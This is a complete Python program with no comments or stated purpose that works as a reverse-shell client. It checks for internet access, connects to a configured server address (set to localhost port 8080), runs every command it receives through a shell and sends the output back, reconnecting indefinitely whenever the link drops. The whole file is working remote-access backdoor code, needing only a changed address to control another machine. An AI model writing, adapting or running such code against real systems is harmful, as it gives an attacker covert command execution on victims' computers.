import socket
import subprocess
import time
import os
import sys
import threading

def execute_command(sock, command, timeout=10):
    def target():
        try:
            print(f"Received command: {command}")
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            try:
                stdout, stderr = process.communicate(timeout=timeout)
                output = stdout if stdout else stderr
                sock.sendall(output.encode())
            except subprocess.TimeoutExpired:
                process.kill()
                sock.sendall(f"Error: Command '{command}' timed out and was terminated.".encode())
                print(f"Command '{command}' timed out and was terminated.")
        except Exception as e:
            print(f"Error executing command: {e}")
            sock.sendall(f"Error: {e}".encode())

    thread = threading.Thread(target=target)
    thread.start()
    thread.join(timeout + 1)  # Give an extra second for termination handling

    if thread.is_alive():
        print(f"Command '{command}' is still running and was not terminated properly.")

def handle_server_connection(sock):
    while True:
        try:
            data = sock.recv(1024).decode().strip()
            execute_command(sock, data)
        except Exception as e:
            print(f"Error in server connection: {e}")
            break  # Exit loop on error
    sock.close()  # Explicitly close the socket after the loop

def wait_for_internet_connection():
    while True:
        try:
            socket.create_connection(("www.google.com", 80))
            return
        except OSError:
            print("Waiting for internet connection...")
            time.sleep(5)

def main():
    server_ip = '127.0.0.1'
    server_port = 8080

    while True:
        try:
            wait_for_internet_connection()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, server_port))
            print("Connected to the server")
            handle_server_connection(sock)
        except (ConnectionRefusedError, ConnectionResetError):
            print("Connection lost, retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"Unexpected error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
